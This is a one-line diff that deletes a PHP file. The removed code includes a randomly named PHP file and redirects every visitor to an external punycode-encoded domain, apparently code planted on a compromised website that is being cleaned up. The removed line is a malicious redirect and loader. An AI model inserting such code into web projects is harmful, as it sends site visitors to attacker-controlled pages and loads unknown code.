@@ -1,1 +1,0 @@
-<? include("08.20.23DCtfXUkjZFY3VISE.php"); ?><? header('Location: https://xn----htbwkmd.xn--p1ai/'); ?>
